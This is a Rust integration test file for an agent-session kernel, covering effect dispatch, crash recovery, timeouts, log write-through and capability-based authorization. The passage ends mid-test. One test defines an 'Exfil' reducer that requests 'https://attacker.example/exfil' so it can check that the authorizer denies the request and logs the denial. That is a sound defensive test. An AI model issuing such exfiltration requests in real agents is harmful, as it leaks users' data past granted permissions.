//! Integration tests for the v0.1 milestone (design §15b):
//! "one agent session runs a real task loop reactively, and survives a kill/restart mid-effect
//! without double-firing."
//!
//! These exercise the review's load-bearing invariants end-to-end: durable dispatch (S1),
//! effect-id-keyed continuations with timeout-cancels (S4), resource-scoped authz (SEC-F1), and
//! deterministic replay recovery.

use cdz_kernel::authz::Authorizer;
use cdz_kernel::effect::{
    Capability, EffectKind, EffectRequest, Payload, ResourcePredicate, Timeliness,
};
use cdz_kernel::event::{ContentType, EffectOutcome, Event, EventBody};
use cdz_kernel::executor::{Executor, RecordingExecutor};
use cdz_kernel::hash::Hash;
use cdz_kernel::kernel::Session;
use cdz_kernel::kv::Kv;
use cdz_kernel::reducer::{Effect, FoldOutput, Reducer};

/// A small but realistic reducer: on an inbound "go" message it performs an Http fetch; when the
/// fetch RESULT arrives it records "done" in KV and performs a second Http call (a step-2). This is
/// the effect→continuation→next-effect pattern (S4): the continuation is implicit in KV state
/// ("phase"), resumed by the result event.
struct TwoStepReducer;

#[async_trait::async_trait(?Send)]
impl Reducer for TwoStepReducer {
    async fn fold(&mut self, event: &Event, kv: &mut Kv) -> FoldOutput {
        match &event.body {
            EventBody::Inbound { .. } => {
                kv.put(b"phase".to_vec(), b"fetching".to_vec());
                FoldOutput::with(vec![EffectRequest::new(
                    EffectKind::Http,
                    "https://ok.host/step1",
                    None,
                    Timeliness::Interactive,
                )])
            }
            EventBody::EffectResult {
                result: EffectOutcome::Ok(_),
                ..
            } => {
                // A step completed — advance the phase and, if this was step 1, fire step 2.
                match kv.get(b"phase") {
                    Some(b"fetching") => {
                        kv.put(b"phase".to_vec(), b"step2".to_vec());
                        FoldOutput::with(vec![EffectRequest::new(
                            EffectKind::Http,
                            "https://ok.host/step2",
                            None,
                            Timeliness::Interactive,
                        )])
                    }
                    Some(b"step2") => {
                        kv.put(b"phase".to_vec(), b"done".to_vec());
                        FoldOutput::none()
                    }
                    _ => FoldOutput::none(),
                }
            }
            _ => FoldOutput::none(),
        }
    }
}

fn http_cap() -> Authorizer {
    Authorizer::new(vec![Capability {
        kind: EffectKind::Http,
        predicate: ResourcePredicate::HostIn(vec!["ok.host".into()]),
    }])
}

fn inbound_go() -> EventBody {
    EventBody::Inbound {
        content_type: ContentType {
            family: "message".into(),
            version: 1,
        },
        payload: Payload::Inline(b"go".to_vec().into()),
    }
}

#[tokio::test(flavor = "current_thread")]
async fn reactive_two_step_loop_runs_to_completion() {
    let mut reducer = TwoStepReducer;
    let authz = http_cap();
    let mut exec = RecordingExecutor::new();
    let mut session = Session::genesis(Hash::of(b"two-step-v1"), Hash::of(b"test-spawn-nonce"));

    session
        .deliver(inbound_go(), None, &mut reducer, &authz, &mut exec)
        .await
        .unwrap();

    // Both steps ran, in order, and the reducer reached "done" — driven entirely by the single
    // inbound delivery (reactivity: append wakes the reducer, §9d).
    assert_eq!(session.kv().get(b"phase"), Some(&b"done"[..]));
    assert_eq!(exec.seen.len(), 2);
    assert_eq!(
        exec.seen[0].0.target_str().unwrap(),
        "https://ok.host/step1"
    );
    assert_eq!(
        exec.seen[1].0.target_str().unwrap(),
        "https://ok.host/step2"
    );
    // Every effect settled; nothing left open.
    assert_eq!(session.open_effects(), 0);
}

#[tokio::test(flavor = "current_thread")]
async fn effect_chain_populates_the_causal_dag() {
    // §5 causal DAG: every effect-chain event must be `cause`-linked to the event that unlocked it,
    // so audit / blast-radius (§9f) / on-behalf-of provenance (§12f) can traverse it. Walk the log of
    // the two-step run and verify the chain threads inbound → dispatch → result → dispatch → result,
    // each `cause` pointing at its parent's hash. (Before this fix, effect-chain events were written
    // with cause: None — a silent hole in the provenance graph.)
    use cdz_kernel::hash::Hash as H;
    use std::collections::HashMap;

    let mut reducer = TwoStepReducer;
    let mut exec = RecordingExecutor::new();
    let mut session = Session::genesis(H::of(b"two-step-v1"), H::of(b"test-spawn-nonce"));
    session
        .deliver(inbound_go(), None, &mut reducer, &http_cap(), &mut exec)
        .await
        .unwrap();

    // Index every event by its hash so we can follow `cause` edges.
    let by_hash: HashMap<H, &Event> = session.log().iter().map(|e| (e.hash(), e)).collect();

    // Genesis + inbound have no effect-cause; every Dispatched/EffectResult MUST have a cause that
    // resolves to an event actually in this log (no dangling edges, no None).
    for e in session.log() {
        match &e.body {
            EventBody::Dispatched { .. } | EventBody::EffectResult { .. } => {
                let cause = e.cause.expect("effect-chain event must carry a cause (§5)");
                assert!(
                    by_hash.contains_key(&cause),
                    "cause edge must resolve to an in-log event, got dangling {cause:?}"
                );
            }
            _ => {}
        }
    }

    // Specifically: each EffectResult is caused by a Dispatched (trigger → dispatch → result thread).
    for e in session.log() {
        if let EventBody::EffectResult { .. } = &e.body {
            let parent = by_hash[&e.cause.unwrap()];
            assert!(
                matches!(parent.body, EventBody::Dispatched { .. }),
                "an EffectResult's cause must be its Dispatched"
            );
        }
    }

    // And the second dispatch (step2) is caused by an EffectResult (step1's) — proving the chain
    // extends past the first hop, not just trigger→dispatch.
    let second_dispatch = session
        .log()
        .iter()
        .filter(|e| matches!(e.body, EventBody::Dispatched { .. }))
        .nth(1)
        .expect("two dispatches");
    let cause = by_hash[&second_dispatch.cause.unwrap()];
    assert!(
        matches!(cause.body, EventBody::EffectResult { .. }),
        "step2's dispatch must be caused by step1's result (chain extends across hops)"
    );
}

#[tokio::test(flavor = "current_thread")]
async fn denied_effect_is_logged_and_never_executed() {
    // A reducer that tries to reach a host outside its capability (the SEC-F1 attack).
    struct Exfil;
    #[async_trait::async_trait(?Send)]
    impl Reducer for Exfil {
        async fn fold(&mut self, event: &Event, _kv: &mut Kv) -> FoldOutput {
            if matches!(event.body, EventBody::Inbound { .. }) {
                FoldOutput::with(vec![EffectRequest::new(
                    EffectKind::Http,
                    "https://attacker.example/exfil",
                    None,
                    Timeliness::Interactive,
                )])
            } else {
                FoldOutput::none()
            }
        }
    }
    let mut exec = RecordingExecutor::new();
    let mut session = Session::genesis(Hash::of(b"exfil"), Hash::of(b"test-spawn-nonce"));
    session
        .deliver(inbound_go(), None, &mut Exfil, &http_cap(), &mut exec)
        .await
        .unwrap();

    // The executor NEVER saw the effect (SEC-F1: denied at the gate)...
    assert_eq!(exec.seen.len(), 0);
    // ...and the denial is on the authoritative log for audit (§10).
    assert!(session
        .log()
        .iter()
        .any(|e| matches!(e.body, EventBody::AuthzDenied { .. })));
}

#[tokio::test(flavor = "current_thread")]
async fn crash_after_dispatch_before_result_does_not_double_fire() {
    // Simulate the S1 crash race: the log has a `Dispatched` for an effect whose real side effect
    // already happened, but the process died before the `EffectResult` was recorded. On recovery we
    // must NOT re-run the effect blindly — the dispatch is a known open obligation, re-driven ONLY via
    // its idempotency key so the executor can dedup.
    let mut reducer = TwoStepReducer;

    // Build a log ending in a Dispatched-with-no-result (the crash point).
    let mut session = Session::genesis(Hash::of(b"two-step-v1"), Hash::of(b"test-spawn-nonce"));
    // Drive step 1's dispatch by hand-constructing the crash state via a custom executor that records
    // the effect but then we truncate the log before the result. Easiest: run normally, then chop.
    let authz = http_cap();
    let mut exec = RecordingExecutor::new();
    session
        .deliver(inbound_go(), None, &mut reducer, &authz, &mut exec)
        .await
        .unwrap();

    // Full run performed 2 effects. Now emulate a crash right after the FIRST dispatch was made
    // durable but before its result: take the log up to and including the first `Dispatched`.
    let full_log = session.log().to_vec();
    let first_dispatch_idx = full_log
        .iter()
        .position(|e| matches!(e.body, EventBody::Dispatched { .. }))
        .expect("a dispatch was logged");
    let crashed_log: Vec<Event> = full_log[..=first_dispatch_idx].to_vec();

    // Recover from the truncated log.
    let recovered = Session::replay(crashed_log, &mut reducer).await.unwrap();

    // The recovery correctly identifies exactly one OPEN (dispatched-but-unsettled) effect (S1)...
    assert_eq!(recovered.open_effects(), 1);
    let open = recovered.open_effect_ids();
    assert_eq!(open.len(), 1);

    // ...and re-driving that open dispatch reuses its idempotency key, so a side-effecting executor
    // would dedup rather than double-fire. Verify the key is stable across the crash: the recovered
    // dispatch record carries the SAME idempotency key the original executor was called with.
    let orig_key = exec.seen[0].1;
    let recovered_dispatch = recovered
        .log()
        .iter()
        .find_map(|e| match &e.body {
            EventBody::Dispatched {
                idempotency_key, ..
            } => Some(*idempotency_key),
            _ => None,
        })
        .unwrap();
    assert_eq!(
        orig_key, recovered_dispatch,
        "idempotency key must be stable across crash so re-drive dedups (S1)"
    );
}

#[tokio::test(flavor = "current_thread")]
async fn timeout_cancels_so_a_late_result_is_dropped() {
    // S4 timeout-cancels: if a dispatch times out (settled as TimedOut), a subsequently-arriving real
    // result for the same id must be dropped — the continuation resumes at most once.
    // We build this directly on the session API by settling an effect via a timeout, then attempting
    // to record a late Ok for the same id and asserting the reducer is not resumed twice.

    // A reducer that counts how many times it folds an EffectResult::Ok into KV.
    struct CountResumes;
    #[async_trait::async_trait(?Send)]
    impl Reducer for CountResumes {
        async fn fold(&mut self, event: &Event, kv: &mut Kv) -> FoldOutput {
            if matches!(event.body, EventBody::Inbound { .. }) {
                return FoldOutput::with(vec![EffectRequest::new(
                    EffectKind::Http,
                    "https://ok.host/slow",
                    None,
                    Timeliness::Interactive,
                )]);
            }
            if let EventBody::EffectResult {
                result: EffectOutcome::Ok(_),
                ..
            } = &event.body
            {
                let n = kv.get(b"resumes").map(|b| b[0]).unwrap_or(0) + 1;
                kv.put(b"resumes".to_vec(), vec![n]);
            }
            FoldOutput::none()
        }
    }

    // An executor that always TIMES OUT the effect (models a hung call the deadline fired on).
    struct TimeoutExecutor;
    #[async_trait::async_trait(?Send)]
    impl Executor for TimeoutExecutor {
        async fn perform(
            &mut self,
            _id: cdz_kernel::effect::EffectId,
            _req: &EffectRequest,
            _key: Hash,
        ) -> EffectOutcome {
            EffectOutcome::TimedOut
        }
    }

    let mut reducer = CountResumes;
    let mut exec = TimeoutExecutor;
    let mut session = Session::genesis(Hash::of(b"count"), Hash::of(b"test-spawn-nonce"));
    session
        .deliver(inbound_go(), None, &mut reducer, &http_cap(), &mut exec)
        .await
        .unwrap();

    // The effect timed out → the reducer folded a TimedOut (not an Ok), so no resume counted yet.
    assert_eq!(session.kv().get(b"resumes"), None);
    // The id is settled and not open (§16c-S4): a late Ok for it would be dropped by the kernel.
    assert_eq!(session.open_effects(), 0);
}

#[tokio::test(flavor = "current_thread")]
async fn time_out_effect_settles_an_open_dispatch_and_resumes_the_reducer() {
    // S4 recovery contract, the "or time out" half: Session::recover hands the driver open_effects it
    // must "re-drive OR time out." This exercises the time-out path — a genuinely-outstanding dispatch
    // (here the post-crash recovered one) is settled as TimedOut by the KERNEL (no executor returns it),
    // the reducer's timeout continuation runs, and the outcome folds observably (live == replay).

    // A reducer that fetches on inbound, and on a TIMED-OUT result records that it gave up (its §9d
    // anti-stuck continuation). It reacts to TimedOut specifically — the timeout is a real fold input.
    struct GiveUpOnTimeout;
    #[async_trait::async_trait(?Send)]
    impl Reducer for GiveUpOnTimeout {
        async fn fold(&mut self, event: &Event, kv: &mut Kv) -> FoldOutput {
            match &event.body {
                EventBody::Inbound { .. } => FoldOutput::with(vec![EffectRequest::new(
                    EffectKind::Http,
                    "https://ok.host/slow",
                    None,
                    Timeliness::Interactive,
                )]),
                EventBody::EffectResult {
                    result: EffectOutcome::TimedOut,
                    ..
                } => {
                    kv.put(b"status".to_vec(), b"gave-up".to_vec());
                    FoldOutput::none()
                }
                _ => FoldOutput::none(),
            }
        }
    }

    // Drive to a mid-flight dispatch, then recover into a fresh session with that effect still OPEN
    // (models a crash after Dispatched, before any result — the state a driver must resolve).
    let mut reducer = GiveUpOnTimeout;
    let mut exec = RecordingExecutor::new();
    let mut session = Session::genesis(Hash::of(b"giveup-v1"), Hash::of(b"test-spawn-nonce"));
    session
        .deliver(inbound_go(), None, &mut reducer, &http_cap(), &mut exec)
        .await
        .unwrap();
    let full_log = session.log().to_vec();
    let dispatch_idx = full_log
        .iter()
        .position(|e| matches!(e.body, EventBody::Dispatched { .. }))
        .unwrap();
    let open_id = match &full_log[dispatch_idx].body {
        EventBody::Dispatched { id, .. } => *id,
        _ => unreachable!(),
    };
    // Replay only up to the dispatch → a recovered session with one open, un-resulted effect.
    let mut restored = Session::replay(full_log[..=dispatch_idx].to_vec(), &mut reducer)
        .await
        .expect("replay");
    assert_eq!(restored.open_effect_ids(), vec![open_id]);
    assert_eq!(restored.kv().get(b"status"), None);

    // Time it out (the driver's "or time out" action). It settles + the reducer's timeout continuation
    // runs (status=gave-up), and the id is no longer open.
    let mut exec2 = RecordingExecutor::new();
    assert!(
        restored
            .time_out_effect(open_id, &mut reducer, &http_cap(), &mut exec2)
            .await
    );
    assert_eq!(restored.kv().get(b"status"), Some(&b"gave-up"[..]));
    assert_eq!(restored.open_effects(), 0);

    // Idempotent (§16c-S4 at-most-once): timing out an already-settled id is a no-op, and a NEVER-
    // dispatched id is likewise false — so a timeout + a late real result can't both settle one id.
    assert!(
        !restored
            .time_out_effect(open_id, &mut reducer, &http_cap(), &mut exec2)
            .await
    );
    assert!(
        !restored
            .time_out_effect(
                cdz_kernel::effect::EffectId(9999),
                &mut reducer,
                &http_cap(),
                &mut exec2
            )
            .await
    );

    // The timeout outcome folded observably, so a replay of the WHOLE resulting log reconstructs the
    // same KV (the §16c-S3 determinism the observable() predicate guarantees).
    let replayed = Session::replay(restored.log().to_vec(), &mut reducer)
        .await
        .expect("replay after timeout");
    assert_eq!(replayed.kv().get(b"status"), Some(&b"gave-up"[..]));
    assert_eq!(replayed.kv(), restored.kv());
}

#[tokio::test(flavor = "current_thread")]
async fn time_out_effect_on_an_armed_timer_id_is_a_noop_not_a_panic() {
    // Copilot PR#1016: `open` holds BOTH dispatched-effect ids AND armed-TIMER ids. time_out_effect
    // must not treat a timer id as a dispatched effect — a timer has no Dispatched event, so the old
    // dispatch_hash_of().expect() PANICKED, contradicting the "never dispatched → false" contract. A
    // timer fires via fire_due_timers, not a manual timeout; timing one out is a no-op returning false.
    let mut reducer = TimerReducer { deadline_ms: 5000 };
    let mut exec = RecordingExecutor::new();
    let mut session = Session::genesis(Hash::of(b"timer-v1"), Hash::of(b"test-spawn-nonce"));
    session
        .deliver(inbound_go(), None, &mut reducer, &timer_cap(), &mut exec)
        .await
        .unwrap();

    // The timer is armed → its id is OPEN (an obligation), but it's a TimerArmed, not a Dispatched.
    let armed_id = session
        .log()
        .iter()
        .find_map(|e| match &e.body {
            EventBody::TimerArmed { id, .. } => Some(*id),
            _ => None,
        })
        .expect("a timer was armed");
    assert_eq!(session.open_effect_ids(), vec![armed_id]);

    // Timing out the TIMER id must be a clean no-op (false), NOT a panic. The timer stays armed.
    let mut exec2 = RecordingExecutor::new();
    assert!(
        !session
            .time_out_effect(armed_id, &mut reducer, &timer_cap(), &mut exec2)
            .await,
        "timing out an armed-timer id is a no-op (timers fire via fire_due_timers), not a panic"
    );
    // The timer is untouched — still open, still armed for its deadline, and can still fire normally.
    assert_eq!(session.open_effect_ids(), vec![armed_id]);
    assert_eq!(session.next_timer_deadline(), Some(5000));
    let fired = session
        .fire_due_timers(5000, &mut reducer, &timer_cap(), &mut exec2)
        .await;
    assert_eq!(fired, 1);
    assert_eq!(session.kv().get(b"woke"), Some(&b"1"[..]));
    assert_eq!(session.open_effects(), 0);
}

#[tokio::test(flavor = "current_thread")]
async fn attached_log_persists_through_on_append_no_manual_mirroring() {
    // §16c-S1 write-through (tier B): with a LogStore attached, a live Session persists every event
    // AS IT APPENDS — the driver does NOT mirror events by hand. Deliver a two-step run against an
    // attached store, then recover PURELY from that store's file in a fresh session and confirm the
    // whole run reconstructs (KV + no open obligations) — proving the session wrote through itself.
    use cdz_kernel::log_store::LogStore;

    let mut path = std::env::temp_dir();
    path.push(format!(
        "cdz-kernel-writethrough-{}.log",
        std::process::id()
    ));
    let _ = std::fs::remove_file(&path);

    let mut reducer = TwoStepReducer;
    let mut exec = RecordingExecutor::new();
    let mut session = Session::genesis(Hash::of(b"two-step-v1"), Hash::of(b"test-spawn-nonce"));
    // The store holds the log up to the current tip before attaching (here: just genesis). Then
    // write-through owns every subsequent append.
    {
        let mut store = LogStore::open(&path).unwrap();
        for e in session.log() {
            store.append(e).unwrap();
        }
        session.attach_log(store);
    }

    // Drive the whole two-step loop. NO manual persistence after this point — the session writes through.
    session
        .deliver(inbound_go(), None, &mut reducer, &http_cap(), &mut exec)
        .await
        .unwrap();
    assert_eq!(session.kv().get(b"phase"), Some(&b"done"[..]));
    // No persistence error was latched — every event reached disk.
    assert!(session.take_persist_error().is_none());

    // Recover from the FILE ONLY — `recover` opens the path independently (it does not attach a live
    // store to the reconstructed session). The reconstructed session matches the live one.
    let (restored, report) = Session::recover(&path, &mut reducer)
        .await
        .expect("recover from written-through log");
    assert_eq!(report.kind, cdz_kernel::log_store::RecoveryKind::Clean);
    assert_eq!(restored.kv().get(b"phase"), Some(&b"done"[..]));
    // Both effects settled during the run, so recovery sees no open obligations.
    assert_eq!(restored.open_effects(), 0);
    assert_eq!(restored.log().len(), session.log().len());

    // Drop `session` (which holds the attached LogStore's open File) BEFORE unlinking: POSIX unlinks
    // an open file fine, but Windows refuses to remove a file with a live handle — the swallowed
    // remove_file error would then leak the temp. `restored` holds no handle (recover opened + closed
    // the path), so only `session` needs dropping.
    drop(session);
    let _ = std::fs::remove_file(&path);
}

#[tokio::test(flavor = "current_thread")]
async fn a_reducers_continuation_token_is_recorded_in_the_dispatched_frame() {
    // §19b/§19e slice 2: a reducer's per-effect continuation token (Effect.token) must travel through
    // the fold→drive handoff into the DURABLE Dispatched frame — so the EffectId↔token map can rebuild
    // from the log on recovery (the §19e hard guard). This proves the channel: a reducer emitting an
    // effect WITH a token → the logged Dispatched carries it; one WITHOUT → token None.
    struct TokenReducer;
    #[async_trait::async_trait(?Send)]
    impl Reducer for TokenReducer {
        async fn fold(&mut self, event: &Event, _kv: &mut Kv) -> FoldOutput {
            if matches!(event.body, EventBody::Inbound { .. }) {
                FoldOutput::with_effects(vec![Effect {
                    request: EffectRequest::new(
                        EffectKind::Http,
                        "https://ok.host/x",
                        None,
                        Timeliness::Interactive,
                    ),
                    token: Some(b"guest-cont-42".to_vec()),
                }])
            } else {
                FoldOutput::none()
            }
        }
    }

    let mut exec = RecordingExecutor::new();
    let mut session = Session::genesis(Hash::of(b"token-v1"), Hash::of(b"test-spawn-nonce"));
    session
        .deliver(
            inbound_go(),
            None,
            &mut TokenReducer,
            &http_cap(),
            &mut exec,
        )
        .await
        .unwrap();

    // The Dispatched frame for the emitted effect carries the reducer's token verbatim.
    let dispatched_token = session.log().iter().find_map(|e| match &e.body {
        EventBody::Dispatched { token, .. } => Some(token.clone()),
        _ => None,
    });
    assert_eq!(
        dispatched_token,
        Some(Some(b"guest-cont-42".to_vec())),
        "the reducer's continuation token must reach the durable Dispatched frame (§19e)"
    );

    // §19b/§19e (B): the token RIDES the EffectResult too — the kernel copies it from the Dispatched
    // frame onto the result event when it records the result, so a wasm reducer's fold can read it back
    // as the guest's `resumes` without touching the log/map. The executor here returned Ok, so a result
    // was recorded; its token must equal the dispatch's token (derived from the durable frame).
    let result_token = session.log().iter().find_map(|e| match &e.body {
        EventBody::EffectResult { token, .. } => Some(token.clone()),
        _ => None,
    });
    assert_eq!(
        result_token,
        Some(Some(b"guest-cont-42".to_vec())),
        "the EffectResult must carry the same token as its Dispatched frame (§19e (B) — rides the result)"
    );

    // Control: a token-free reducer (the common Rust path via FoldOutput::with) records token None.
    let mut exec2 = RecordingExecutor::new();
    let mut s2 = Session::genesis(Hash::of(b"notoken-v1"), Hash::of(b"test-spawn-nonce"));
    s2.deliver(
        inbound_go(),
        None,
        &mut TwoStepReducer,
        &http_cap(),
        &mut exec2,
    )
    .await
    .unwrap();
    let first_token = s2.log().iter().find_map(|e| match &e.body {
        EventBody::Dispatched { token, .. } => Some(token.clone()),
        _ => None,
    });
    assert_eq!(
        first_token,
        Some(None),
        "a token-free reducer records token None"
    );
}

#[tokio::test(flavor = "current_thread")]
async fn a_continuation_token_rides_timer_fired_and_authz_denied_events() {
    // §19b/§19e slice 2b-iii: the continuation token must ride ALL THREE terminal outcomes a guest
    // resumes on, not just EffectResult. A TIMER token is recorded in the durable TimerArmed frame and
    // COPIED onto TimerFired when the kernel fires it; a DENIED effect's token is MOVED onto the
    // AuthzDenied event (a denial has no prior durable frame — the effect never ran). This proves both
    // channels so a wasm ComponentReducer reads its own `resumes` back on a timer wake / a denial.
    struct TokenTimerAndDenyReducer;
    #[async_trait::async_trait(?Send)]
    impl Reducer for TokenTimerAndDenyReducer {
        async fn fold(&mut self, event: &Event, _kv: &mut Kv) -> FoldOutput {
            match &event.body {
                // Inbound: arm a timer WITH a continuation token.
                EventBody::Inbound { .. } => FoldOutput::with_effects(vec![Effect {
                    request: EffectRequest::new(
                        EffectKind::Timer,
                        "1000", // absolute deadline ms
                        None,
                        Timeliness::Interactive,
                    ),
                    token: Some(b"timer-cont-7".to_vec()),
                }]),
                _ => FoldOutput::none(),
            }
        }
    }

    let mut exec = RecordingExecutor::new();
    let mut session = Session::genesis(Hash::of(b"token-timer-v1"), Hash::of(b"test-spawn-nonce"));
    session
        .deliver(
            inbound_go(),
            None,
            &mut TokenTimerAndDenyReducer,
            &timer_cap(),
            &mut exec,
        )
        .await
        .unwrap();

    // The token reached the durable TimerArmed frame (the arming analogue of Dispatched.token).
    let armed_token = session.log().iter().find_map(|e| match &e.body {
        EventBody::TimerArmed { token, .. } => Some(token.clone()),
        _ => None,
    });
    assert_eq!(
        armed_token,
        Some(Some(b"timer-cont-7".to_vec())),
        "the reducer's continuation token must reach the durable TimerArmed frame (§19e 2b-iii)"
    );

    // Fire the timer: the kernel copies the token from TimerArmed onto TimerFired (rides the fire).
    assert_eq!(
        session
            .fire_due_timers(1000, &mut TokenTimerAndDenyReducer, &timer_cap(), &mut exec)
            .await,
        1
    );
    let fired_token = session.log().iter().find_map(|e| match &e.body {
        EventBody::TimerFired { token, .. } => Some(token.clone()),
        _ => None,
    });
    assert_eq!(
        fired_token,
        Some(Some(b"timer-cont-7".to_vec())),
        "the TimerFired must carry the same token as its TimerArmed frame (§19e (B) — rides the fire)"
    );

    // DENIAL channel: a reducer emits a token-bearing effect the authorizer DENIES → the token rides
    // the AuthzDenied event (moved from the request; no prior durable frame exists for a denied effect).
    struct DenyTokenReducer;
    #[async_trait::async_trait(?Send)]
    impl Reducer for DenyTokenReducer {
        async fn fold(&mut self, event: &Event, _kv: &mut Kv) -> FoldOutput {
            if matches!(event.body, EventBody::Inbound { .. }) {
                FoldOutput::with_effects(vec![Effect {
                    request: EffectRequest::new(
                        EffectKind::Http,
                        "https://denied.host/x",
                        None,
                        Timeliness::Interactive,
                    ),
                    token: Some(b"denied-cont-9".to_vec()),
                }])
            } else {
                FoldOutput::none()
            }
        }
    }
    // A capability that authorizes Timer but NOT Http → the Http effect is denied.
    let mut exec2 = RecordingExecutor::new();
    let mut s2 = Session::genesis(Hash::of(b"token-deny-v1"), Hash::of(b"test-spawn-nonce"));
    s2.deliver(
        inbound_go(),
        None,
        &mut DenyTokenReducer,
        &timer_cap(),
        &mut exec2,
    )
    .await
    .unwrap();
    // The effect never reached the executor (denied)...
    assert_eq!(exec2.seen.len(), 0);
    // ...and its continuation token rode the AuthzDenied event.
    let denied_token = s2.log().iter().find_map(|e| match &e.body {
        EventBody::AuthzDenied { token, .. } => Some(token.clone()),
        _ => None,
    });
    assert_eq!(
        denied_token,
        Some(Some(b"denied-cont-9".to_vec())),
        "the AuthzDenied must carry the denied effect's token (§19e 2b-iii — rides the denial)"
    );
}

#[tokio::test(flavor = "current_thread")]
async fn s1_route_guard_does_not_perform_an_effect_whose_dispatch_failed_to_persist() {
    // §16c-S1 tier-B route-guard (concierge ruling): if the Dispatched frame fails to PERSIST, the
    // kernel must NOT route the effect (an irreversible executor call on an un-durable dispatch is the
    // real S1 danger). A LogSink that always Errs deterministically triggers the persist failure — the
    // fault-injection seam the S1 latch-check was previously untestable without (a real LogStore over a
    // file can't be made to fail its append: a read-only file fails at OPEN, not append).
    use cdz_kernel::log_store::LogSink;

    struct FailingSink;
    #[async_trait::async_trait(?Send)]
    impl LogSink for FailingSink {
        async fn append(&mut self, _event: &cdz_kernel::event::Event) -> std::io::Result<()> {
            Err(std::io::Error::other("disk full (injected)"))
        }
    }

    // A reducer that dispatches one Http effect on inbound.
    struct OneShot;
    #[async_trait::async_trait(?Send)]
    impl Reducer for OneShot {
        async fn fold(&mut self, event: &Event, _kv: &mut Kv) -> FoldOutput {
            if matches!(event.body, EventBody::Inbound { .. }) {
                FoldOutput::with(vec![EffectRequest::new(
                    EffectKind::Http,
                    "https://ok.host/x",
                    None,
                    Timeliness::Interactive,
                )])
            } else {
                FoldOutput::none()
            }
        }
    }

    let mut exec = RecordingExecutor::new();
    let mut session = Session::genesis(Hash::of(b"oneshot-v1"), Hash::of(b"test-spawn-nonce"));
    session.attach_sink(Box::new(FailingSink));

    session
        .deliver(inbound_go(), None, &mut OneShot, &http_cap(), &mut exec)
        .await
        .unwrap();

    // The Dispatched frame's persist failed → the guard fired → the executor was NEVER called (the
    // irreversible side-effect did not run on an un-durable dispatch — the S1 guarantee).
    assert_eq!(
        exec.seen.len(),
        0,
        "an effect whose Dispatched didn't persist must NOT be routed to the executor (S1)"
    );
    // The persist failure is latched + surfaced to the driver.
    assert!(
        session.take_persist_error().is_some(),
        "the persist failure must be latched for the driver to observe"
    );
    // And the effect's outcome was recorded as a failed-undurable result (observable, folds live==replay),
    // so the id settled rather than dangling open.
    assert_eq!(session.open_effects(), 0);
    assert!(session.log().iter().any(|e| matches!(
        &e.body,
        EventBody::EffectResult { result: EffectOutcome::Err { message: msg, .. }, .. } if msg.contains("not durably logged")
    )));
}

#[tokio::test(flavor = "current_thread")]
async fn persist_crash_recover_reconstructs_kv_and_open_obligations() {
    // End-to-end durability (§16c-S1): run a session while PERSISTING every appended event to a
    // LogStore, simulate a crash right after a Dispatched is durable but before its result, then
    // recover PURELY from disk and confirm the KV and the open-obligation set are reconstructed.
    use cdz_kernel::log_store::LogStore;

    let mut path = std::env::temp_dir();
    path.push(format!("cdz-kernel-e2e-{}.log", std::process::id()));
    let _ = std::fs::remove_file(&path);

    // Phase 1: run the two-step reducer, persisting the log as we go, but crash after the FIRST
    // dispatch. We drive the session, then persist only the prefix up to that dispatch — modelling a
    // process that flushed the Dispatched frame and died before writing the result frame.
    let mut reducer = TwoStepReducer;
    let mut exec = RecordingExecutor::new();
    let mut session = Session::genesis(Hash::of(b"two-step-v1"), Hash::of(b"test-spawn-nonce"));
    session
        .deliver(inbound_go(), None, &mut reducer, &http_cap(), &mut exec)
        .await
        .unwrap();

    let full_log = session.log().to_vec();
    let first_dispatch_idx = full_log
        .iter()
        .position(|e| matches!(e.body, EventBody::Dispatched { .. }))
        .unwrap();

    {
        let mut store = LogStore::open(&path).unwrap();
        for e in &full_log[..=first_dispatch_idx] {
            store.append(e).unwrap();
        }
        // store drops here — the "crash": everything after the first Dispatched was never written.
    }

    // Phase 2: recover from disk ONLY, then replay into a fresh Session.
    let recovered = LogStore::recover(&path).unwrap();
    assert_eq!(recovered.kind, cdz_kernel::log_store::RecoveryKind::Clean);
    let restored = Session::replay(recovered.events, &mut reducer)
        .await
        .unwrap();

    // KV reconstructed to the crash point (reducer had set phase=fetching before dispatching)...
    assert_eq!(restored.kv().get(b"phase"), Some(&b"fetching"[..]));
    // ...and exactly one open obligation (the dispatched-but-unresulted effect) is known, so the
    // driver would re-drive it by its (stable) idempotency key rather than double-fire (§16c-S1).
    assert_eq!(restored.open_effects(), 1);

    let _ = std::fs::remove_file(&path);
}

#[tokio::test(flavor = "current_thread")]
async fn session_recover_is_the_one_call_recovery_entry_point() {
    // The composed entry point (§16c-S1): Session::recover(path) does LogStore::recover + replay in
    // one call and hands the driver a RecoveryReport (kind + open_effects to re-drive). This is
    // what an operator actually calls to boot a persisted session.
    use cdz_kernel::kernel::{RecoverError, RecoveryReport};
    use cdz_kernel::log_store::{LogStore, RecoveryKind};

    let mut path = std::env::temp_dir();
    path.push(format!("cdz-kernel-recover-{}.log", std::process::id()));
    let _ = std::fs::remove_file(&path);

    // No file yet → EmptyLog, so the caller knows to genesis() rather than getting a silent empty
    // session.
    let mut reducer = TwoStepReducer;
    assert!(matches!(
        Session::recover(&path, &mut reducer).await,
        Err(RecoverError::EmptyLog)
    ));

    // Persist a session up to a mid-flight dispatch (the crash point), then recover via the one call.
    let mut exec = RecordingExecutor::new();
    let mut session = Session::genesis(Hash::of(b"two-step-v1"), Hash::of(b"test-spawn-nonce"));
    session
        .deliver(inbound_go(), None, &mut reducer, &http_cap(), &mut exec)
        .await
        .unwrap();
    let full_log = session.log().to_vec();
    let first_dispatch_idx = full_log
        .iter()
        .position(|e| matches!(e.body, EventBody::Dispatched { .. }))
        .unwrap();
    {
        let mut store = LogStore::open(&path).unwrap();
        for e in &full_log[..=first_dispatch_idx] {
            store.append(e).unwrap();
        }
    }

    let (restored, report): (Session, RecoveryReport) = Session::recover(&path, &mut reducer)
        .await
        .expect("recover");
    assert_eq!(restored.kv().get(b"phase"), Some(&b"fetching"[..]));
    // The report tells the driver exactly what's in flight to re-drive, and how the log ended.
    assert_eq!(report.kind, RecoveryKind::Clean);
    assert!(!report.is_corrupt());
    assert_eq!(report.open_effects.len(), 1);
    assert_eq!(report.open_effects, restored.open_effect_ids());

    let _ = std::fs::remove_file(&path);
}

#[tokio::test(flavor = "current_thread")]
async fn session_recover_from_is_backend_agnostic_no_file_needed() {
    // The generic recovery core (operator directive "the log should be generic"): Session::recover_from
    // takes an already-read `Recovered` from ANY backend — here a hand-built one, NO file involved — and
    // reconstructs the session + report identically to the file path. This is what a network/replicated
    // log backend calls after reading its own bytes; the kernel core carries no file assumption.
